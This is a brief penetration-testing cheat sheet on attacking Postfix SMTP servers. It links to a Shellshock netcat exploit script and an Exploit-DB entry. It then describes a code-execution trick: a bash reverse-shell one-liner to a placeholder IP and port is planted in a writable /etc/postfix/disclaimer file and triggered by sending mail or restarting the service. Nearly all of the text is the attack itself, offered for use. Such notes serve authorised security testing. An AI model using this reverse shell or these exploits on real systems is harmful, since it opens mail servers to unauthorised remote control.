# postfix smtp

## Shellsock

* [https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py](https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py)
* [https://www.exploit-db.com/exploits/34896](https://www.exploit-db.com/exploits/34896)

## /etc/postfix/disclaimer RCE

REQUIREMENT: **`/etc/postfix/disclaimer` needs to writable**

```bash
# add shell to top of file
bash -i >& /dev/tcp/IP/PORT 0>&1

# invoke
send email via smtp
[OR] service postfix restart
```

